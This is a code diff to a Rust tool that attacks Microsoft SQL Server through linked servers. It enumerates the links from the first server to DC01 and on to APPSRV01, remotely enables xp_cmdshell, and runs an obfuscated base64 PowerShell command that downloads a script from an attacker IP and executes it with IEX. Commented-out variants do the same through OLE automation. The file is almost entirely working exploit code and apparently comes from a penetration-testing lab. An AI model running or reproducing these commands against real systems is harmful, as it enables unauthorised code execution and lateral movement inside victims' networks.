@@ -101,28 +101,64 @@ async fn main() {
     }
 
     println!("[+] Checking for linked SQL servers...");
-    let linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();
+    let mut linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();
     println!("--> {:?}", linked);
 
     // let cmd_res: Vec<String> = get_query(&mut conn, "select version from openquery(\"dc01\", 'select @@version as version')", true).await.unwrap();
     // println!("{}", cmd_res[0]);
 
-    let sub_query: String = String::from("select SYSTEM_USER as s_user"); 
+    let mut sub_query: String = String::from("select SYSTEM_USER as s_user"); 
     query = String::from(format!("select s_user from openquery(\"dc01\", '{}')", &sub_query));
-    println!("--> Executing as {} on DC01:", get_query(&mut conn, &query, true).await.unwrap()[0]);
+    println!("--> Executing as {} on DC01", get_query(&mut conn, &query, true).await.unwrap()[0]);
+    
+    // println!("[+] Enabling advanced options on DC01");
+    // execute_query(&mut conn, "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01").await;
 
-    // println!("[+] Enabling xp_cmdshell");
-    // query = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+    // println!("[+] Enabling xp_cmdshell on DC01");
+    //query = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+    // query = String::from("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT DC01");
     // execute_query(&mut conn, &query).await;
 
-    // println!("[+] Executing command 'whoami'");
-    // execute_query(&mut conn, "EXEC xp_cmdshell 'curl http://192.168.49.79/hellooooo'").await;
-    println!("[+] Enabling OLE Automation Procedures");
-    query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
+    // println!("[+] Executing command");
+    // query = String::from("EXEC ('xp_cmdshell ''powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='' ') AT DC01");
+    // execute_query(&mut conn, &query).await;
+
+    // Nested commands
+    println!("[+] Finding linked servers on DC01");
+    linked = get_query(&mut conn, "EXEC ('sp_linkedservers') AT DC01", true).await.unwrap();
+    println!("--> {:?}", linked);
+
+    sub_query = String::from("select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')");
+    query = String::from(format!("select mylogin from openquery(\"dc01\", '{}')", &sub_query));
+
+    println!("--> Executing as {} on APPSRV01", get_query(&mut conn, &query, true).await.unwrap()[0]);
+
+    println!("[+] Enabling advanced options back on appsrv01");
+    query = String::from("EXEC ('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT DC01");
     execute_query(&mut conn, &query).await;
 
-    println!("[+] Executing command");
-    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAOQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
+    println!("[+] Enabling xp_cmdshell on appsrv01");
+    query = String::from("EXEC ('EXEC(''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appsrv01') AT DC01");
+    execute_query(&mut conn, &query).await;
+
+    println!("[+] Executing nested command");
+    query = String::from("EXEC ('EXEC(''xp_cmdshell ''''powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='''' '') AT appsrv01') AT DC01");
+    execute_query(&mut conn, &query).await;
+
+
+
+    // println!("[+] Executing command");
+    // query = String::from("EXEC ('xp_cmdshell ''powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='' ') AT DC01");
+    // execute_query(&mut conn, &query).await;
+
+
+
+    // println!("[+] Enabling OLE Automation Procedures");
+    // query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
+    // execute_query(&mut conn, &query).await;
+
+    // println!("[+] Executing command");
+    // query = String::from("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==\"'");
     // execute_query(&mut conn, &query).await;
 
         
